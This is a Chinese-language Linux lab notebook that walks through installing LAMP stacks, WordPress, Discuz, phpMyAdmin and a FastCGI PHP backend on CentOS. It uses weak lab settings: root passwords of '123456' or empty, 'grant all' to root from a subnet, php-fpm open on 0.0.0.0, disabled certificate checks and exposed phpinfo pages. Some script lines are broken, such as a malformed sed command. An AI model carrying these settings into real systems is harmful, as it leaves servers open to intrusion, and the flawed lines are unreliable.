使用PDO扩展模块pdo_mysql.so连接数据库，此方式可以支持连接MySQL，Oracle等多种数据库

#1.1检查LAMP是否安装完毕
[root@centos8 ~]# systemctl enable --now mysqld
[root@centos8 ~]# rpm -q mysql-server httpd php php-mysqlnd
mysql-server-8.0.17-3.module_el8.0.0+181+899d6349.x86_64
httpd-2.4.37-21.module_el8.2.0+382+15b0afa8.x86_64
php-7.2.24-1.module_el8.2.0+313+b04d0a66.x86_64
php-mysqlnd-7.2.24-1.module_el8.2.0+313+b04d0a66.x86_64


#1.2编写php测试连接代码
[root@centos8 ~]# cd /var/www/html/
[root@centos8 html]# vim lamp.php
<?php
try {
$user='root';
$pass='';
$dbh = new PDO('mysql:host=localhost;port=3306;dbname=mysql', $user, $pass);
foreach($dbh->query('SELECT user,host from user') as $row) {
print_r($row);
}
$dbh = null;
} catch (PDOException $e) {
print "Error!: " . $e->getMessage() . "<br/>";
die();
}
?>
[root@centos8 ~]# systemctl restart php-fpm httpd mysqld
```

#### 37.5.2phpMyadmin

```
#1.下载源码包
[root@centos8 ~]# wget https://files.phpmyadmin.net/phpMyAdmin/5.2.0/phpMyAdmin-5.2.0-all-languages.zip
[root@centos8 ~]# unzip phpMyAdmin-5.2.0-all-languages.zip 
[root@centos8 ~]# mv phpMyAdmin-5.2.0-all-languages /var/www/html/pam
[root@centos8 ~]# yum -y install php-json php-xml




#2.开启php错误日志
[root@centos8 ~]# sed -i 's/;error_log = php_errors.log/error_log =\/var\/log\/php-fpm\/php_errors.log/' /etc/php.ini
[root@centos8 ~]# grep -n error_log /etc/php.ini
584:error_log =/var/log/php-fpm/php_errors.log
[root@centos8 ~]# systemctl restart php-fpm


#3.设置mysql的密码
[root@centos8 ~]# mysqladmin password 123456
```

![1654689921901](linuxSRE.assets/1654689921901.png)

![1654689980025](linuxSRE.assets/1654689980025.png)

#### 37.5.3wordpress搭建

```
#1.下载wordpress源码
[root@centos8 ~]# wget https://cn.wordpress.org/latest-zh_CN.tar.gz
[root@centos8 ~]# tar xf latest-zh_CN.tar.gz
[root@centos8 ~]# mv wordpress/ blog/
[root@centos8 ~]# mv blog /var/www/html/




#2.允许appache对数据库进行写操作
[root@centos8 ~]# chown -R apache.apache /var/www/html/
浏览器上输入http://10.0.0.8/blog/




#3.修改最大上传文件大小
[root@centos8 ~]# grep 2M /etc/php.ini 
upload_max_filesize = 2M
[root@centos8 ~]# sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php.ini
[root@centos8 ~]# grep 20M /etc/php.ini 
upload_max_filesize = 20M
[root@centos8 ~]# sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php.ini 
[root@centos8 ~]# grep 80M /etc/php.ini 
post_max_size = 80M
[root@centos8 ~]# systemctl restart php-fpm
```

![1654691141063](linuxSRE.assets/1654691141063.png)

#### 37.5.4Discuz论坛搭建

```
#1.下载源码包
[root@centos8 ~]# wget https://www.discuz.net/files/DiscuzX/3.4/Discuz_X3.4_SC_UTF8_20220518.zip
[root@centos8 ~]# unzip Discuz_X3.4_SC_UTF8_20220518.zip 
[root@centos8 ~]# mv upload/ /var/www/html/forum



#2.设置apache权限
[root@centos8 ~]# chown -R apache.apache /var/www/html/forum
```

![1654692080297](linuxSRE.assets/1654692080297.png)

![1654692195900](linuxSRE.assets/1654692195900.png)

![1654692476347](linuxSRE.assets/1654692476347.png)

![1654692509549](linuxSRE.assets/1654692509549.png)

![1654692963222](linuxSRE.assets/1654692963222.png)

![1654692991685](linuxSRE.assets/1654692991685.png)

![1654693200983](linuxSRE.assets/1654693200983.png)

#### 37.5.5opcache加速php

```
#centos8安装下包直接加速成功
[root@centos8 ~]# dnf install php-opcache -y


#centos7清华大学yum源安装最新版php
[09:53:57 root@centos7 ~]#wget https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/remi-release-7.rpm --no-check-certificate
[09:55:37 root@centos7 ~]#yum -y install remi-release-7.rpm php74-php-fpm php74-php-mysqlnd
```

#### 37.5.6基于FASTCGI的LAMP架构

```
0.#配置apche让接收到的php请求发送到fastcgi-server
[10:36:19 root@centos7 ~]# mkdir /data/html
[10:36:28 root@centos7 ~]# vim /data/html/test.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>


#1.指向fastcgi-server
[10:27:49 root@centos7 ~]#vim /etc/httpd/conf.d/test.conf
DirectoryIndex index.php
ProxyRequests Off  #启用反向代理
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/html/$1 #$1后向引用，前面访问的如果是a.php，就去/data/html/下找a.php
ProxyPassMatch ^/(php_status|ping) fcgi://127.0.0.1:9000
[10:41:19 root@centos7 ~]#systemctl restart httpd



#2.多主机访问
[10:44:57 root@centos7 ~]#vim /etc/opt/remi/php74/php-fpm.d/www.conf 
38 listen = 127.0.0.1:9000
64 listen.allowed_clients = 127.0.0.1
252 ping.path = /ping
257 ping.response = liu pong
240 pm.status_path = /php_status
```

![1654744727468](linuxSRE.assets/1654744727468.png)

测试status状态页

![1654745024409](linuxSRE.assets/1654745024409.png)

测试ping

![1654744850885](linuxSRE.assets/1654744850885.png)

### 37.6综合实战

#### 37.6.1普通安装基于FASTCGI模式LAMP架构分离WEB应用

![1654745746127](linuxSRE.assets/1654745746127.png)

```
#0.目标
CentOS 7利用清华yum源，安装php7.4+wordpress5.4.2+opcache+event模式



#1.环境准备
三台主机：10.0.0.7：apache httpd
10.0.0.17:php
10.0.0.27:mysql
```

**10.0.0.7**:

```
[11:49:40 root@centos7 ~]#yum -y install httpd
[11:17:56 root@centos7 ~]#vim /etc/httpd/conf.d/test.conf
DirectoryIndex index.php
ProxyRequests Off  
ProxyPassMatch ^/(.*\.php)$ fcgi://10.0.0.17:9000/data/html/$1
ProxyPassMatch ^/(php_status|ping) fcgi://10.0.0.17:9000
[13:48:04 root@centos7 ~]#systemctl enable --now httpd
在浏览器上输入10.0.0.7/info.php查看结果
```

![1654755026628](linuxSRE.assets/1654755026628.png)

**10.0.0.17:**

```
[root@pxc2 ~]# yum -y install php-fpm php-mysql
[root@pxc2 ~]# vim /etc/php-fpm.d/www.conf
12 listen = 0.0.0.0:9000
24 ;listen.allowed_clients = 127.0.0.1
133 ping.path = /ping
121 pm.status_path = /php_status
[root@pxc2 ~]# systemctl enable --now php-fpm

[root@pxc2 ~]# mkdir /data/html
[root@pxc2 ~]# vim /data/html/info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>

#测试数据库的连接
[root@pxc2 ~]# vim /data/html/mysql.php
<?php
try {
$user='root';
$pass='123456';
$dbh = new PDO('mysql:host=10.0.0.27;port=3306;dbname=mysql', $user, $pass);
foreach($dbh->query('SELECT user,host from user') as $row) {
print_r($row);
}
$dbh = null;
} catch (PDOException $e) {
print "Error!: " . $e->getMessage() . "<br/>";
die();
}
?>
在浏览器上输入http://10.0.0.7/mysql.php测试连接
```

![1654755772868](linuxSRE.assets/1654755772868.png)

**10.0.0.27**:

```
[root@pxc3 ~]# yum -y install mariadb-server
[root@pxc3 ~]# systemctl enable --now mariadb
MariaDB [(none)]> grant all on *.* to root@'10.0.0.%' identified by '123456';

```

#### 37.6.2编译安装基于FASTCGI模式LAMP架构多虚拟主机WEB应用

![1654745746127](linuxSRE.assets/1654745746127.png)

```
#0.目标
实现CentOS 7编译安装基于fastcgi模式的多虚拟主机wordpress和discuz的LAMP架构


 
1.四台主机
windows完成客户端用hosts文件做域名解析
10.0.0.8：数据库服务
10.0.0.7：wordpress和discuz
10.0.0.17：fastcgi-server

```

##### 37.6.2.1windows相关配置

第一步：修改权限

![1654772432853](linuxSRE.assets/1654772432853.png)

第二步：host域名解析

![1654772356860](linuxSRE.assets/1654772356860.png)

第三步：测试能不能ping通

![1654772495675](linuxSRE.assets/1654772495675.png)

```
#0.准备对应的包
[19:07:29 root@centos7 ~]# wget https://cn.wordpress.org/latest-zh_CN.tar.gz #wordpress源代码
[19:07:29 root@centos7 ~]# wget https://www.discuz.net/files/DiscuzX/3.4/Discuz_X3.4_SC_UTF8_20220518.zip #discuz源代码
[19:40:13 root@centos7 ~]# wget https://www.php.net/distributions/php-7.4.19.tar.gz
```

##### 37.6.2.2二进制安装mysql

```
#在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
#MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成"
}

check
install_mysql
```

![1654776596899](linuxSRE.assets/1654776596899.png)

##### 37.6.2.3编译安装httpd2.4

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/apps/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo 'PATH=/apps/httpd-2.4.53/bin:$PATH' > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

![1654787061778](linuxSRE.assets/1654787061778.png)

##### 37.6.2.4编译安装httpd模块方式php-7.4

```
#基于10.0.0.7
#0.安装php-7.4相关包
[21:26:51 root@centos7 ~]# yum -y install gcc libxml2-devel bzip2-devel libmcrypt-devel sqlite-devel oniguruma-devel
[21:34:57 root@centos7 ~]# tar xvf php-7.4.19.tar.gz 
[21:34:57 root@centos7 ~]#cd php-7.4.19/



#1.编译php7.4
[root@centos7 ~]# cd php-7.4.19
[root@centos7 php-7.4.19]#./configure --prefix=/apps/php \
--with-config-file-scan-dir=/etc/php.d \--enable-mysqlnd \
--with-mysqli=mysqlnd \
--with-pdo-mysql=mysqlnd \
--with-config-file-path=/etc \
--enable-fpm \
--with-zlib \
--enable-xml \
--enable-mbstring \
--with-openssl \
--enable-sockets \
--enable-maintainer-zts \
--disable-fileinfo


#2.安装
[root@centos7 php-7.4.19]# make -j 8 && make install



#3.查看是否编译成功
[root@centos7 ~]# /apps/php/bin/php --version
PHP 7.4.19 (cli) (built: Jun  9 2022 22:56:51) ( ZTS )
Copyright (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
[root@centos7 ~]# php --version



#4.准备PATH变量
[root@centos7 ~]# vim /etc/profile.d/lamp.sh
PATH=/apps/php/bin:/apps/httpd-2.4.53/bin:$PATH
[root@centos7 ~]# . /etc/profile.d/lamp.sh



#5.准备php配置文件和启动文件
[root@centos7 ~]# cp /root/php-7.4.19/php.ini-production /etc/php.ini
[root@centos7 ~]# cp /root/php-7.4.19/sapi/fpm/php-fpm.service /lib/systemd/system/
[root@centos7 ~]# cd /apps/php/etc/
[root@centos7 etc]# cp php-fpm.conf.default php-fpm.conf
[root@centos7 etc]# cd php-fpm.d/
[root@centos7 php-fpm.d]# cp www.conf.default www.conf



#6.修改进程所有者
[root@centos7 php-fpm.d]# pwd
/apps/php/etc/php-fpm.d
 23 user = apache
 24 group = apache
 239 pm.status_path = /fpm_status
 251 ping.path = /ping
 
 
 
 
#7.支持opcache加速
 [root@centos7 php-fpm.d]# mkdir /etc/php.d/
[root@centos7 php-fpm.d]# vim /etc/php.d/opcache.ini
[opcache]
zend_extension=opcache.so
opcache.enable=1



#8.启动
[root@centos7 php-fpm.d]# systemctl daemon-reload
[root@centos7 php-fpm.d]# systemctl enable --now php-fpm.service
```

编译成功！！！

![1654786345249](linuxSRE.assets/1654786345249.png)

##### 37.6.2.5 10.0.0.7主机相关配置

```
#1.修改httpd.conf配置文件
[root@centos7 php-7.4.19]# vim /apps/httpd-2.4.53/conf/httpd.conf
120 LoadModule proxy_module modules/mod_proxy.so
124 LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
260 <IfModule dir_module>
261     DirectoryIndex index.php index.html
262 </IfModule>
#文件最后加如下两行
AddType application/x-httpd-php .php
ProxyRequests Off


#实现第一个虚拟主机
<virtualhost *:80>
servername blog.liusenbiao.org
documentroot /data/blog
<directory /data/blog>
require all granted
</directory>
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/blog/$1
#实现status和ping页面
ProxyPassMatch ^/(fpm_status|ping)$ fcgi://127.0.0.1:9000/$1
CustomLog "logs/access_blog_log" common
</virtualhost>

#第二个虚拟主机
<virtualhost *:80>
servername forum.liusenbiao.org
documentroot /data/forum
<directory /data/forum/>
require all granted
</directory>
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/forum/$1
CustomLog "logs/access_forum_log" common
</virtualhost>

#2.重启服务
[root@centos7 php-7.4.19]# systemctl restart httpd
```

##### 37.6.2.6 10.0.0.8主机相关配置

```
#0.数据库进行授权
[root@centos8 ~]# mysql -uroot -p123456
mysql> create database blog;
mysql> create database forum;
mysql> create user blog@'10.0.0.%' identified by '123456';
mysql> create user forum@'10.0.0.%' identified by '123456';
mysql> grant all on blog.* to blog@'10.0.0.%';
mysql> grant all on forum.* to forum@'10.0.0.%';
```

##### 37.6.2.7准备wordpress和discuz相关文件

```
#1.解压缩文件
[root@centos7 php-fpm.d]# cd /data/
[root@centos7 data]# mkdir blog forum
[root@centos7 ~]# cd
[root@centos7 ~]# tar xf latest-zh_CN.tar.gz
[root@centos7 ~]# mv wordpress/* /data/blog/
[root@centos7 opt]# unzip Discuz_X3.4_SC_UTF8_20220518.zip
[root@centos7 opt]# mv upload/* /data/forum/


#2.授权apache
[root@centos7 opt]# chown -R apache.apache /data/*



#3.验证实验是否成功
浏览器上分别输入
http://blog.liusenbiao.org/
http://forum.liusenbiao.org/



#4.验证opcache是否加速成功
[root@centos7 data]# cd /data/blog/
[root@centos7 blog]# vim info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>
```

wordpress搭建成功！！！！

![1654792011217](linuxSRE.assets/1654792011217.png)

discuz搭建成功！！！！

![1654792095994](linuxSRE.assets/1654792095994.png)

opcache加速成功！！！

![1654792442240](linuxSRE.assets/1654792442240.png)